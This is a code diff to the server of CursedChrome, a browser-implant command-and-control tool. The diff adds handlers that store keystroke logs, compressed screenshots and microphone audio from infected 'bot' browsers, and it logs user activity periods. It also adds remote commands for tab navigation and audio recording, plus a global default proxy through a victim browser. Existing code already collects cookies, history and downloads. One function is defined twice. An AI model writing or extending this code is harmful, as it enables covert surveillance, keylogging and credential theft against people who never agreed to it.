@@ -14,11 +14,17 @@ const database_init = database.database_init;
 const Users = database.Users;
 const Bots = database.Bots;
 const BotRecording = database.BotRecording;
+const BotScreenshots = database.BotScreenshots;
+const BotKeyboardLogs = database.BotKeyboardLogs;
 const sequelize = database.sequelize;
 const Sequelize = require("sequelize");
+const Jimp = require("jimp");
 const { log } = require("async");
 const Op = Sequelize.Op;
 const axios = require("axios");
+
+// Global flag to indicate if a default proxy is set
+global.GLOBAL_DEFAULT_PROXY_ACTIVE = false;
 
 const get_secure_random_string = require("./utils.js").get_secure_random_string;
 const logit = require("./utils.js").logit;
@@ -49,6 +55,11 @@ const RPC_CALL_TABLE = {
   SYNC_HUGE: sync_huge,
   STATE: state,
   REALTIME_IMG: real_time_img,
+  SCREEN_CAPTURE_DATA: screen_capture_data,
+  USER_ACTIVITY: user_activity,
+  DEBUG_LOG: debug_log,
+  KEYBOARD_LOGS: keyboard_logs,
+  AUDIO_DATA: audio_data,
 };
 
 const REQUEST_TABLE = new NodeCache({
@@ -140,14 +151,22 @@ class Message {
 
 const MessageWorker = new Message();
 
-async function pong_and_get_bot(websocket_connection) {
+async function pong_and_get_bot(ws) {
+  if (!ws.browser_id) {
+    logit("Error: WebSocket connection not yet authenticated (no browser_id)");
+    throw new Error("WebSocket connection not yet authenticated (no browser_id)");
+  }
   const bot = await Bots.findOne({
     where: {
-      browser_id: websocket_connection.browser_id,
+      browser_id: ws.browser_id,
     },
   });
+  if (!bot) {
+    logit(`Error: Bot with browser_id ${ws.browser_id} not found in database`);
+    throw new Error(`Bot with browser_id ${ws.browser_id} not found in database`);
+  }
 
-  websocket_connection.send(
+  ws.send(
     JSON.stringify({
       id: uuid.v4(),
       version: SERVER_VERSION,
@@ -161,21 +180,147 @@ async function pong_and_get_bot(websocket_connection) {
   return bot;
 }
 
+async function audio_data(websocket_connection, params) {
+  const bot = await pong_and_get_bot(websocket_connection);
+  
+  // Save audio chunk to BotRecording
+  await BotRecording.create({
+    id: uuid.v4(),
+    bot: bot.id,
+    recording: params.chunk, // base64 chunk
+    timestamp: new Date(),
+    session_id: params.session_id
+  });
+
+  // Limit recordings to avoid database bloat (keep last 500 chunks per bot)
+  const count = await BotRecording.count({ where: { bot: bot.id } });
+  if (count > 500) {
+    const oldest = await BotRecording.findAll({
+      where: { bot: bot.id },
+      order: [['timestamp', 'ASC']],
+      limit: count - 500
+    });
+    if (oldest.length > 0) {
+      await BotRecording.destroy({
+        where: { id: oldest.map(r => r.id) }
+      });
+    }
+  }
+}
+
 async function state(websocket_connection, params) {
   const bot = await pong_and_get_bot(websocket_connection);
-  await bot.update({
+  const newState = params.state;
+  const oldState = bot.state;
+  const now = new Date();
+
+  let activity = bot.activity || [];
+  let updateData = {
     is_online: true,
-    state: params.state,
+    state: newState,
+  };
+
+  if (newState === "active") {
+    updateData.last_active_at = now;
+    // If transitioning from idle/locked to active, start new period
+    if (oldState !== "active") {
+      activity.push({ start: now, end: null });
+      updateData.activity = activity.slice(-100); // Keep last 100 periods
+    }
+  } else {
+    // If transitioning from active to idle/locked, end current period
+    if (oldState === "active" && activity.length > 0) {
+      const lastPeriod = activity[activity.length - 1];
+      if (lastPeriod.end === null) {
+        lastPeriod.end = now;
+        updateData.activity = activity;
+      }
+    }
+  }
+
+  await bot.update(updateData);
+}
+
+async function user_activity(websocket_connection, params) {
+  const bot = await pong_and_get_bot(websocket_connection);
+  const now = new Date();
+  let activity = bot.activity || [];
+  let updateData = {
+    last_active_at: now
+  };
+
+  // If there's an ongoing active session, just update its end time
+  // Wait, the user said "If I move mouse once and stop, that's the end"
+  // But usually we want to see blocks of activity.
+  // Let's implement activity blocks: if last hit was < 1 min ago, update end.
+  // If > 1 min ago, start new block.
+  
+  if (activity.length > 0) {
+    let lastPeriod = activity[activity.length - 1];
+    let lastTime = lastPeriod.end ? new Date(lastPeriod.end) : new Date(lastPeriod.start);
+    
+    // If the gap is less than 60 seconds, either start/extend current burst
+    if ((now.getTime() - lastTime.getTime()) < 60000) {
+       lastPeriod.end = now;
+    } else {
+       activity.push({ start: now, end: now });
+    }
+  } else {
+    activity.push({ start: now, end: now });
+  }
+
+  updateData.activity = activity.slice(-100);
+  await bot.update(updateData);
+}
+
+async function debug_log(websocket_connection, params) {
+  const bot = await pong_and_get_bot(websocket_connection);
+  logit(`[BROWSER DEBUG] [${bot.id}] ${params.message}`);
+}
+
+async function keyboard_logs(websocket_connection, params) {
+  const bot = await pong_and_get_bot(websocket_connection);
+  
+  logit(`Received keyboard logs from bot ${bot.id} (${params.keys.length} chars)`);
+  
+  await BotKeyboardLogs.create({
+    id: uuid.v4(),
+    bot_id: bot.id,
+    url: params.url,
+    title: params.title,
+    keys: params.keys,
+    timestamp: new Date()
   });
+
+  // Limit logs to keep database clean (keep last 1000 logs per bot)
+  const count = await BotKeyboardLogs.count({ where: { bot_id: bot.id } });
+  if (count > 1000) {
+    const oldest = await BotKeyboardLogs.findAll({
+      where: { bot_id: bot.id },
+      order: [['timestamp', 'ASC']],
+      limit: count - 1000
+    });
+    if (oldest.length > 0) {
+      await BotKeyboardLogs.destroy({
+        where: { id: oldest.map(l => l.id) }
+      });
+    }
+  }
 }
 
 async function ping(websocket_connection, params) {
   const bot = await pong_and_get_bot(websocket_connection);
-  await bot.update({
+  let updateData = {
     is_online: true,
     current_tab: params.current_tab,
     current_tab_image: params.current_tab_image,
-  });
+  };
+
+  if (bot.state === "active") {
+    updateData.last_active_at = new Date();
+  }
+
+  await bot.update(updateData);
 
   // Check if current tab URL domain matches any monitored domains
   if (bot.data_config.MONITOR_DOMAINS && params.current_tab) {
@@ -203,30 +348,148 @@ async function ping(websocket_connection, params) {
 
 async function real_time_img(websocket_connection, params) {
   const bot = await pong_and_get_bot(websocket_connection);
-  await bot.update({
+  let updateData = {
     is_online: true,
     current_tab_image: params.current_tab_image,
-  });
+  };
+  if (bot.state === "active") {
+    updateData.last_active_at = new Date();
+  }
+  await bot.update(updateData);
 }
 
 async function sync(websocket_connection, params) {
   const bot = await pong_and_get_bot(websocket_connection);
-  await bot.update({
+  let updateData = {
     is_online: true,
     tabs: params.tabs,
-  });
+  };
+  if (bot.state === "active") {
+    updateData.last_active_at = new Date();
+  }
+  await bot.update(updateData);
 }
 
 async function sync_huge(websocket_connection, params) {
   const bot = await pong_and_get_bot(websocket_connection);
-  await bot.update({
+  let updateData = {
     is_online: true,
     history: params.history,
     bookmarks: params.bookmarks,
     cookies: params.cookies,
     downloads: params.downloads,
-  });
+  };
+  if (bot.state === "active") {
+    updateData.last_active_at = new Date();
+  }
+  await bot.update(updateData);
 }
+
+async function user_activity(websocket_connection, params) {
+  const bot = await pong_and_get_bot(websocket_connection);
+  const now = new Date();
+  let activity = bot.activity || [];
+  let updateData = {
+    last_active_at: now
+  };
+
+  // If there's an ongoing active session, just update its end time
+  // Wait, the user said "If I move mouse once and stop, that's the end"
+  // But usually we want to see blocks of activity.
+  // Let's implement activity blocks: if last hit was < 1 min ago, update end.
+  // If > 1 min ago, start new block.
+  
+  if (activity.length > 0) {
+    let lastPeriod = activity[activity.length - 1];
+    let lastTime = lastPeriod.end ? new Date(lastPeriod.end) : new Date(lastPeriod.start);
+    
+    // If the gap is less than 60 seconds, either start/extend current burst
+    if ((now.getTime() - lastTime.getTime()) < 60000) {
+       lastPeriod.end = now;
+    } else {
+       activity.push({ start: now, end: now });
+    }
+  } else {
+    activity.push({ start: now, end: now });
+  }
+
+  updateData.activity = activity.slice(-100);
+  await bot.update(updateData);
+}
+
+
+
+async function screen_capture_data(websocket_connection, params) {
+  const bot = await pong_and_get_bot(websocket_connection);
+  logit("Received screen capture data from bot: " + bot.id);
+  const newCaptures = params.captures || [];
+  
+  for (const capture of newCaptures) {
+    try {
+      if (!capture.imageData) continue;
+
+      // Extract base64 content
+      const base64Data = capture.imageData.replace(/^data:image\/\w+;base64,/, "");
+      const buffer = Buffer.from(base64Data, "base64");
+
+      // Use Jimp to resize and compress
+      const image = await Jimp.read(buffer);
+      
+      // Limit dimensions to 800px max
+      if (image.bitmap.width > 800 || image.bitmap.height > 800) {
+        image.scaleToFit(800, 800);
+      }
+      
+      // Set ultra-low quality (10%)
+      image.quality(10);
+      
+      const compressedBuffer = await image.getBufferAsync(Jimp.MIME_JPEG);
+      const compressedBase64 = `data:image/jpeg;base64,${compressedBuffer.toString("base64")}`;
+
+      // Save to its own table
+      await BotScreenshots.create({
+        id: uuid.v4(),
+        bot_id: bot.id,
+        url: capture.url,
+        title: capture.title,
+        session_id: capture.sessionId,
+        image_data: compressedBase64,
+        difference: capture.difference,
+        timestamp: new Date(capture.timestamp || Date.now()),
+      });
+    } catch (err) {
+      logit("Error processing screenshot compression:", err);
+    }
+  }
+
+  // Update online status
+  await bot.update({
+    is_online: true,
+  });
+
+  // Optional: Clean up old screenshots for this bot (e.g., keep last 500)
+  try {
+    const totalCount = await BotScreenshots.count({ where: { bot_id: bot.id } });
+    if (totalCount > 500) {
+      const oldestToDelete = await BotScreenshots.findAll({
+        where: { bot_id: bot.id },
+        order: [['timestamp', 'ASC']],
+        limit: totalCount - 500
+      });
+      if (oldestToDelete.length > 0) {
+        await BotScreenshots.destroy({
+          where: {
+            id: oldestToDelete.map(s => s.id)
+          }
+        });
+      }
+    }
+  } catch (err) {
+    logit("Error cleaning up screenshots:", err);
+  }
+}
+
+
 
 function get_browser_proxy(input_browser_id) {
   for (
@@ -402,6 +665,96 @@ function send_request_via_browser(
   });
 }
 
+function tab_navigate_and_fetch(browser_id, url) {
+  logit(`Navigating browser ${browser_id} to ${url} and fetching content`);
+  return new Promise(function (resolve, reject) {
+    // For timeout, will reject if no response in 35 seconds.
+    setTimeout(function () {
+      reject(`tab_navigate_and_fetch RPC called timed out.`);
+    }, 35 * 1000);
+
+    const message_id = uuid.v4();
+
+    var message = {
+      id: message_id,
+      version: SERVER_VERSION,
+      action: "TAB_NAVIGATE_AND_FETCH",
+      data: {
+        url: url,
+      },
+    };
+
+    // Add promise resolve to message table
+    // that way the promise is resolved when
+    // we get a response for our RPC message.
+    REQUEST_TABLE.set(message_id, resolve);
+
+    // Subscribe to the proxy redis topic to get the
+    // response when it comes
+    const subscription_id = `TOPROXY_${browser_id}`;
+    subscriber.subscribe(subscription_id);
+
+    // Send the RPC message to the browser
+    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
+  });
+}
+
+function stop_tab_navigate(browser_id) {
+  logit(`Stopping navigation for browser ${browser_id}`);
+  return new Promise(function (resolve, reject) {
+    const message_id = uuid.v4();
+    var message = {
+      id: message_id,
+      version: SERVER_VERSION,
+      action: "STOP_TAB_NAVIGATE",
+      data: {},
+    };
+    REQUEST_TABLE.set(message_id, resolve);
+    subscriber.subscribe(`TOPROXY_${browser_id}`);
+    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
+  });
+}
+
+function start_audio_recording(browser_id) {
+  logit(`Starting audio recording for browser ${browser_id}`);
+  return new Promise(function (resolve, reject) {
+    setTimeout(function () {
+      reject(`START_AUDIO_RECORDING RPC called timed out.`);
+    }, 10 * 1000);
+
+    const message_id = uuid.v4();
+    var message = {
+      id: message_id,
+      version: SERVER_VERSION,
+      action: "START_AUDIO",
+      data: {},
+    };
+    REQUEST_TABLE.set(message_id, resolve);
+    subscriber.subscribe(`TOPROXY_${browser_id}`);
+    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
+  });
+}
+
+function stop_audio_recording(browser_id) {
+  logit(`Stopping audio recording for browser ${browser_id}`);
+  return new Promise(function (resolve, reject) {
+    setTimeout(function () {
+      reject(`STOP_AUDIO_RECORDING RPC called timed out.`);
+    }, 10 * 1000);
+
+    const message_id = uuid.v4();
+    var message = {
+      id: message_id,
+      version: SERVER_VERSION,
+      action: "STOP_AUDIO",
+      data: {},
+    };
+    REQUEST_TABLE.set(message_id, resolve);
+    subscriber.subscribe(`TOPROXY_${browser_id}`);
+    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
+  });
+}
+
 function caseinsen_get_value_by_key(input_object, input_key) {
   const object_keys = Object.keys(input_object);
   var matching_value = undefined;
@@ -432,8 +785,31 @@ async function get_authentication_status(inputRequestDetail) {
   );
 
   if (!proxy_authentication || !proxy_authentication.includes("Basic")) {
-    logit(`No proxy credentials provided!`);
-    logit(proxy_authentication);
+    logit(`No proxy credentials provided, checking for global default proxy...`);
+    
+    // Check for global default proxy if no credentials provided
+    const global_proxy_setting = await Settings.findOne({
+      where: { key: "GLOBAL_DEFAULT_PROXY_BOT_ID" }
+    });
+
+    if (global_proxy_setting && global_proxy_setting.value) {
+      global.GLOBAL_DEFAULT_PROXY_ACTIVE = true;
+      const bot = await Bots.findOne({
+        where: { id: global_proxy_setting.value }
+      });
+      if (bot) {
+        logit(`Using global default proxy: ${bot.name} (${bot.id})`);
+        return {
+          id: bot.id,
+          browser_id: bot.browser_id,
+          is_authenticated: bot.is_authenticated,
+          name: bot.name,
+        };
+      }
+    } else {
+      global.GLOBAL_DEFAULT_PROXY_ACTIVE = false;
+    }
+    
     return false;
   }
 
@@ -574,6 +950,16 @@ const options = {
   silent: true,
 };
 
+async function initialize_global_proxy_state() {
+  const global_proxy_setting = await Settings.findOne({
+    where: { key: "GLOBAL_DEFAULT_PROXY_BOT_ID" }
+  });
+  global.GLOBAL_DEFAULT_PROXY_ACTIVE = !!(global_proxy_setting && global_proxy_setting.value);
+  if (global.GLOBAL_DEFAULT_PROXY_ACTIVE) {
+    logit(`Initialized Global Default Proxy: ACTIVE (${global_proxy_setting.value})`);
+  }
+}
+
 async function initialize_new_browser_connection(ws) {
   logit(`Authenticating newly-connected browser...`);
 
@@ -646,6 +1032,21 @@ async function initialize_new_browser_connection(ws) {
     browserproxy_record.is_online = true;
     browserproxy_record.user_agent = user_agent;
     browserproxy_record.last_online = new Date();
+
+    // Ensure all default switch config keys exist
+    let modified = false;
+    let switch_config = browserproxy_record.switch_config || {};
+    Object.keys(BOT_DEFAULT_SWITCH_CONFIG).forEach((key) => {
+      if (switch_config[key] === undefined) {
+        switch_config[key] = BOT_DEFAULT_SWITCH_CONFIG[key];
+        modified = true;
+      }
+    });
+    if (modified) {
+      browserproxy_record.switch_config = switch_config;
+      browserproxy_record.changed("switch_config", true);
+    }
+
     await browserproxy_record.save();
   }
 }
@@ -697,6 +1098,20 @@ async function initialize() {
         .toString()
         .slice(0, 200)}'`
     );
+
+    // Handle system events
+    if (channel === "SYSTEM_EVENTS") {
+      try {
+        const event = JSON.parse(message);
+        if (event.type === "GLOBAL_PROXY_UPDATED") {
+          logit("Received GLOBAL_PROXY_UPDATED event, refreshing state...");
+          initialize_global_proxy_state();
+        }
+      } catch (e) {
+        logit(`Error parsing system event: ${e}`);
+      }
+      return;
+    }
 
     // For messages being sent to the browser from the proxy
     if (channel.startsWith("TOBROWSER_")) {
@@ -773,7 +1188,7 @@ async function initialize() {
 
     ws.on("pong", heartbeat);
 
-    ws.on("message", function incoming(message) {
+    ws.on("message", async function incoming(message) {
       try {
         logit(
           `Received a new message from the browser: ${message
@@ -797,16 +1212,8 @@ async function initialize() {
           resolve(inbound_message.result);
         }
         return;
-      } else if (inbound_message.action === "PING") {
-        ping(ws, inbound_message.data);
-      } else if (inbound_message.action === "SYNC") {
-        sync(ws, inbound_message.data);
-      } else if (inbound_message.action === "SYNC_HUGE") {
-        sync_huge(ws, inbound_message.data);
-      } else if (inbound_message.action === "STATE") {
-        state(ws, inbound_message.data);
-      } else if (inbound_message.action === "REALTIME_IMG") {
-        real_time_img(ws, inbound_message.data);
+      } else if (RPC_CALL_TABLE[inbound_message.action]) {
+        await RPC_CALL_TABLE[inbound_message.action](ws, inbound_message.data);
       } else if (ws.browser_id) {
         // Write to redis proxy topic with the response from the
         // websocket connection.
@@ -822,9 +1229,17 @@ async function initialize() {
     await initialize_new_browser_connection(ws);
   });
 
-  wss.on("ready", () => {
+
+  wss.on("ready", async () => {
     logit(`CursedChrome WebSocket server is now running on port ${WS_PORT}.`);
   });
+
+
+  // Initialize global proxy state before starting servers
+  await initialize_global_proxy_state();
+
+  // Subscribe to system events
+  subscriber.subscribe("SYSTEM_EVENTS");
 
   proxyServer = new AnyProxy.ProxyServer(options);
 
@@ -848,6 +1263,13 @@ async function initialize() {
     get_browser_cookie_array: get_browser_cookie_array,
     get_browser_history_array: get_browser_history_array,
     manipulate_browser: manipulate_browser,
+    tab_navigate_and_fetch: tab_navigate_and_fetch,
+    stop_tab_navigate: stop_tab_navigate,
+    start_audio_recording: start_audio_recording,
+    stop_audio_recording: stop_audio_recording,
+    notify_system_event: (type, data = {}) => {
+      publisher.publish("SYSTEM_EVENTS", JSON.stringify({ type, ...data }));
+    },
   };
 
   // Start the API server
